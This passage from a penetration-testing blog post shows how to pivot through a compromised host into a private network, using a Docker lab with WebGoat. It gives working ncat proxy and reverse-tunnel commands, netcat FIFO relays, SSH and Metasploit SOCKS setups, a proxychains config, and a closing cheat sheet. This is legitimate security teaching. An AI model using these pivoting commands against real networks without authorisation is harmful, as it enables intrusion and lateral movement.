+8080/tcp <span class="token function">open</span>  http-proxy
+9001/tcp <span class="token function">open</span>  tor-orport
+
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.11 seconds
+
+</code></pre>
+<!--kg-card-end: markdown--><p>We have a scan! Note that only a limited number of port scan types work with this method (mostly Syn scans) and I find it tends to be quite slow, so it pays to limit the range of IP's and ports.</p><h2 id="method-3-pivot-over-a-ncat-or-netcat-relay">Method 3: Pivot over a Ncat or Netcat relay</h2><p>If ncat or netcat are installed on the target (they are usually removed during hardening on modern systems), or if you install it yourself on the target, it can be used to setup a tunnel. </p><p>Ncat is a good proxy tool from the nmap project, but netcat relays are the least reliable method mentioned here. They may work only for a single request before having to be re-established (or establishing them in a loop on the target machine), and will not work on more than a single port. However, sometimes netcat is all you can use.</p><h3 id="tunnel-as-http-proxy-with-ncat">Tunnel as http proxy with ncat</h3><p>ncat can be setup as an http proxy which can be used similar to a socks proxy. Just run the ncat proxy on the target machine, and update the local proxychains config to use an http proxy.</p><p>Unfortunately, ncat is almost never going to be installed by default on a target machine, unless someone has also installed nmap there.</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token comment">## Target machine - setup ncat listener </span>
+pentester@47ab62bc2f3d:~$ ncat -vv --listen 3128 --proxy-type http
+Ncat: Version 7.60 <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Listening on :::3128
+Ncat: Listening on 0.0.0.0:3128
+
+<span class="token comment">## attacker machine (metasploit)</span>
+root@12f888991729:/$ <span class="token function">tail</span> /etc/proxychains.conf -n 3
+<span class="token comment"># defaults set to "tor"</span>
+<span class="token comment">#socks4 	127.0.0.1 9050</span>
+http 172.21.0.3  3128 <span class="token comment"># 172.21.0.3 is the IP of my ssh machine</span>
+
+root@12f888991729:/$ proxychains nmap -sT -P0 -p8080,9001 172.20.0.2
+ProxyChains-3.1 <span class="token punctuation">(</span>http://proxychains.sf.net<span class="token punctuation">)</span>
+
+Starting Nmap 7.60 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2019-09-19 14:26 UTC
+<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.21.0.3:3128-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.20.0.2:8080-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-OK
+<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.21.0.3:3128-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-172.20.0.2:9001-<span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span>-OK
+Nmap scan report <span class="token keyword">for</span> 172.20.0.2
+Host is up <span class="token punctuation">(</span>0.00057s latency<span class="token punctuation">)</span>.
+
+PORT     STATE SERVICE
+8080/tcp <span class="token function">open</span>  http-proxy
+9001/tcp <span class="token function">open</span>  tor-orport
+
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.08 seconds</code></pre>
+<!--kg-card-end: markdown--><h3 id="reverse-tunnel-a-single-port-with-ncat">Reverse tunnel a single port with ncat</h3><p>ncat can also be used to tunnel a single port. In this case, we are using a reverse reach back to connect from target -&gt; attacker. This may be required with some network setups that block incoming connections but allow outgoing.</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token comment"># On attacker / metasploit machine</span>
+$ docker <span class="token function">exec</span> -it pivots_metasploit_1 /bin/bash
+root@12f888991729:/$ ncat -lv --broker -m2 8080
+Ncat: Version 7.60 <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: DDD9 4DF0 A7D6 3F08 DB62 51C7 4358 04C6 81BF F05A
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+
+<span class="token comment"># On ssh / box to pivot from</span>
+$ <span class="token function">ssh</span> pentester@localhost -p 20022
+pentester@localhost's password: 
+pentester@47ab62bc2f3d:~$ ncat -v metasploit 8080 -c <span class="token string">"ncat -v webgoatlocal 8080"</span>
+Ncat: Version 7.60 <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Connected to 172.21.0.2:8080.
+
+<span class="token comment">## Attacker machine on a separate bash session - use wget to retrieve page</span>
+<span class="token comment">## I use nmap here, but I can only scan port 8080.</span>
+root@12f888991729:/$ nmap -sS -P0 -p8080 localhost
+
+Starting Nmap 7.60 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2019-09-19 13:54 UTC
+Nmap scan report <span class="token keyword">for</span> localhost <span class="token punctuation">(</span>127.0.0.1<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span>0.000098s latency<span class="token punctuation">)</span>.
+Other addresses <span class="token keyword">for</span> localhost <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: ::1
+
+PORT     STATE SERVICE
+8080/tcp <span class="token function">open</span>  http-proxy
+
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.35 seconds
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="tunnel-with-netcat">Tunnel with netcat</h3><p>Netcat is similar, but the connection will close on a variety of conditions and need to be restarted, generally after a full connection, including one full HTTP request.</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token comment"># Make backpipe to pass data around</span>
+<span class="token function">mknod</span> pivot p
+<span class="token comment"># Setup the listener on pivot machine - forward traffic the</span>
+<span class="token comment"># pivot machine receives on port 8080 to the webgoat server </span>
+<span class="token comment"># port 8080</span>
+<span class="token function">nc</span> -l -p 8080 0<span class="token operator">&lt;</span>pivot <span class="token operator">|</span> <span class="token function">nc</span> webgoatlocal 8080 1<span class="token operator">&gt;</span>pivot
+
+<span class="token comment">## On attacker machine (metasploit)</span>
+root@12f888991729:/$ <span class="token function">wget</span> ssh:8080/WebGoat
+Saving to: ‘WebGoat'
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="method-4-installing-tools-on-the-target-machine">Method 4: Installing tools on the target machine</h2><p>If you are willing to install tools on the target machine, you could install various command line tools (or even visual desktop servers like VNC) and use the pivot box as a "new" attacker machine. This is sometimes the way to go if installing tools on such a device is allowable in the rules of engagement.</p><p>One additional proxy tool I will mention under this category is <a href="https://github.com/z3APA3A/3proxy?ref=nullsweep.com">3proxy</a>, a swiss army knife of a proxy with tons of options. Unfortunately, for linux hosts you will need to build a static binary to deploy (or attempt to build on the target), so is a little less simple to get running.</p><h2 id="a-quick-pivot-cheatsheet">A Quick Pivot CheatSheet</h2><p>All of these methods are potentially limited by the permissions on the proxy host - non-root users for instance cannot perform certain types of scans over the proxy.</p><h2 id="ssh-pivot">SSH pivot</h2><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token function">ssh</span> -D localhost:<span class="token operator">&lt;</span>local_proxy_port<span class="token operator">&gt;</span> -f -N <span class="token operator">&lt;</span>user<span class="token operator">&gt;</span>@<span class="token operator">&lt;</span>machine_to_pivot<span class="token operator">&gt;</span>
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="metasploit-with-meterpreter">Metasploit with Meterpreter</h2><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash">msf5 <span class="token operator">&gt;</span>route add <span class="token operator">&lt;</span>network_to_proxy_in_CIDR_notation<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>meterpreter_session_id<span class="token operator">&gt;</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Route added
+msf5 <span class="token operator">&gt;</span> use auxiliary/server/socks4a
+msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> SRVPORT 9050
+SRVPORT <span class="token operator">=</span><span class="token operator">&gt;</span> 9050
+msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run -j
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="ncat-http-proxy">Ncat HTTP proxy</h2><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash">$ ncat -vv --listen 3128 --proxy-type http
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="ncat-port-forwarder">Ncat Port Forwarder</h2><p>On attacker machine:</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash">$ ncat -lv --broker -m2 <span class="token operator">&lt;</span>port<span class="token operator">&gt;</span>
+</code></pre>
+<!--kg-card-end: markdown--><p>On pivot machine:</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash">$ ncat -v <span class="token operator">&lt;</span>attacker_ip<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>attacker_port<span class="token operator">&gt;</span> -c <span class="token string">"ncat -v &lt;host_to_pivot_to&gt; &lt;port_on_final_target"</span>
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="netcat-port-forwarder">Netcat Port Forwarder</h2><p>On pivot machine:</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token function">mknod</span> pivot p
+<span class="token function">nc</span> -l -p <span class="token operator">&lt;</span>port_to_listen_on<span class="token operator">&gt;</span> 0<span class="token operator">&lt;</span>pivot <span class="token operator">|</span> <span class="token function">nc</span> <span class="token operator">&lt;</span>ip_to_pivot_to<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>port_to_pivot_to<span class="token operator">&gt;</span> 1<span class="token operator">&gt;</span>pivot
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="proxychains-setup">Proxychains Setup</h2><p>Install and configure proxychains</p><!--kg-card-begin: markdown--><pre class=" language-bash"><code class=" language-bash"><span class="token function">tail</span> /etc/proxychains.conf
+<span class="token comment">#socks4 	127.0.0.1 9050</span>
+http 172.21.0.3  3128
+<span class="token comment">#&lt;type: http/socks4/socks5&gt; &lt;proxy_host&gt; &lt;proxy_port&gt;</span>
+</code></pre>
+<!--kg-card-end: markdown--><h1 id="conclusions">Conclusions</h1><p>Pivoting is important to know when pentesting networks that have private components, and these techniques are an important consideration when designing network topology. Watching externally facing hosts and jump boxes for pivot techniques is one way to halt attackers at an earlier stage.</p><p>Did I miss a good technique? Tell me about it in the comments!</p>
+				</section>
+			</section>
+		</article>
+
+			<footer class="post-footer with-bottom-border">
+				<div class="newsletter newsletter-footer">
+					<h3>Get the Newsletter</h3>
+					<hr>
+					<div class="row">
+					<p> Stay up to date on new content, security news, and some lovingly crafted emails.</p>
+					<div id="mc_embed_signup">
+					<form action="https://nullsweep.us17.list-manage.com/subscribe/post?u=7ee26c5715f62787b8ac64274&amp;id=df3b939c69" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="">
+					    <div id="mc_embed_signup_scroll">
+						<label for="mce-EMAIL">Your Email Address:</label>
+						<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required="">
+					    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+					    <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_7ee26c5715f62787b8ac64274_df3b939c69" tabindex="-1" value=""></div>
+					    <div class="clear"><input type="submit" value="Sign Me Up!" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
+					    </div>
+					</form>
+					</div>
+
+					<!--End mc_embed_signup-->
+					</div>
+				</div>
+					<section class="author-card cf">
+							<figure class="author-image">
+								<a href="/author/charlie/"><img src="https://nullsweep.com/content/images/2020/07/Charlie_sm_sq.jpg" alt="Charlie Belmer's Image"></a>
+							</figure>
+						<div class="author-meta" style="width: 65%; float: left;">
+							 <a class="author-name" href="/author/charlie/">Charlie Belmer</a>
+							 
+							 <div class="author-location">USA</div>
+							 <p class="author-bio">I live for privacy, security, and online freedom because these are the building blocks of a better society, one I want to help create.</p>
+						</div>
+					</section>
+
+					<div class="post-tags">Tagged with: <a href="/tag/pentesting/">Pentesting</a>, <a href="/tag/technical-guides/">Technical Guides</a></div>
+			</footer>
+			<section class="pre-comment">
+			</section>
+	
+
+	<aside class="post-navigation cf">
+			<div class="nav-next">
+				<a href="/deploying-docker-securely/">Deploying Docker Securely</a>
+			</div>
+			<div class="nav-previous">
+				<a href="/a-nosql-injection-primer-with-mongo/">A NoSQL Injection Primer (with Mongo)</a>
+			</div>
+	</aside>
+
+</main>
+
+
+
+	<footer class="site-footer">
+		<ul class="social-bar">
+			<li class="social-bar-icon">
+				<a class="twitter tooltipable" href="https://twitter.com/CharlieBelmer" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+<span class="tooltip">Twitter</span></a>
+			</li>
+			<li class="social-bar-icon">
+				<a class="subscribe icon-feed tooltipable" href="https://nullsweep.com/rss/"><span class="tooltip">RSS Subscribe</span></a>
+			</li>
+		</ul>
+		<div class="inner">
+			<section class="copyright">All content copyright <a href="https://nullsweep.com/">Null Sweep</a> © 2024 • All rights reserved.</section>
+		</div>
+	</footer>
+
+	</div> 
+
+		<script async="" src="/assets/build/scripts/main.js?v=fd3f5fd25e"></script>
+
+	<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous">
+	</script>
+    <script type="text/javascript" src="/assets/build/scripts/prism.js?v=fd3f5fd25e"></script>
+    <!-- Matomo Anaylitcs. this is self hosted and totally private, unlike other analytics platforms!
+	<script type="text/javascript">
+	  var _paq = window._paq = window._paq || [];
+	  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+	  _paq.push(['trackPageView']);
+	  _paq.push(['enableLinkTracking']);
+	  (function() {
+	    var u="//analytics.nullsweep.com/";
+	    _paq.push(['setTrackerUrl', u+'matomo.php']);
+	    _paq.push(['setSiteId', '1']);
+	    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+	    g.type='text/javascript'; g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+	  })();
+	</script>
+ End Matomo Code -->
+
+	<script>
+
+
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+
+    var progressBar = document.querySelector('#reading-progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+
+});
+</script>
+
+
+	<!-- Matomo Anaylitcs. this is self hosted with all privacy features, unlike other analytics platforms! -->
+<!--
+<script>
+    var _paq = _paq || [];
+    _paq.push(["trackPageView"]), _paq.push(["enableLinkTracking"]),
+    function() {
+        _paq.push(["setTrackerUrl", "//analytics.nullsweep.com/gdilitm.php"]), _paq.push(["setSiteId", "1"]);
+        var a = document, r = a.createElement("script"), s = a.getElementsByTagName("script")[0];
+        r.async = !0, r.defer = !0, r.src = "//analytics.nullsweep.com/muokrlt.php", s.parentNode.insertBefore(r, s)
+    }();
+</script>
+<noscript><img src="//analytics.nullsweep.com/gdilitm.php?pqo=1&xfg=1" /></noscript>
+-->
+<!-- End Matomo Code -->
+
+
+
+<div id="ghost-portal-root"></div><div id="sodo-search-root"></div></body></html>
